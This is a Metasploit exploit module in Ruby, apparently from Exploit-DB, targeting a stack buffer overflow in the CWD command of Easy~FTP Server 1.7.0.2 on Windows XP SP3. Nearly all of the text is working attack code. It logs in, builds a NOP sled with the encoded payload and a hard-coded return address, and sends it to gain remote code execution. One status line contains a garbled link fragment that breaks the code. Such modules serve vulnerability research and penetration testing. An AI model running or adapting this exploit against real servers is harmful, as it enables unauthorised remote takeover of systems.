# Exploit Title: Easy~FTP
# Date: March 9, 2010
# Author: Blake
# Version: 1.7.0.2
# Tested on: Windows XP SP3
# CVE :

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
Rank = AverageRanking

include Msf::Exploit::Remote::Ftp

def initialize(info = {})
super(update_info(info,
'Name' => 'Easy~FTP Server v1.7.0.2 CWD Command Buffer Overflow',
'Description' => %q{
This module exploits a stack overflow in the CWD verb in Easy~FTP Server.

You must have valid credentials to trigger this vulnerability.
},
'Author' => 'Blake',
'License' => MSF_LICENSE,
'Version' => 'version 1',
'References' =>
[
[ 'CVE', ''],
[ 'OSVDB', ''],
[ 'EDB-ID', '11539'],
[ 'URL', 'http://www.exploit-db.com/exploits/11539' ],
],
'Privileged' => true,
'DefaultOptions' =>
{
'EXITFUNC' => 'process',
},
'Payload' =>
{
'Space' => 268,
'BadChars' => "\x00\x20\x0a\x0d\x2f\x5c",
'StackAdjustment' => -3500,
},
'Platform' => 'win',
'Targets' =>
[

[ 'Windows XP SP3 English', { 'Ret' => 0x009AFD58 } ],

],
'DisclosureDate' => 'February 15, 2010',
'DefaultTarget' => 0))
end


def exploit
connect_login

sploit = "\x90" * (268 - payload.encoded.length)
sploit << payload.encoded
sploit << [target.ret].pack('V')

print_status("Trying target #{target.name<http://target.name>}...")

send_cmd( ['CWD', sploit] , false)

handler
disconnect
end

end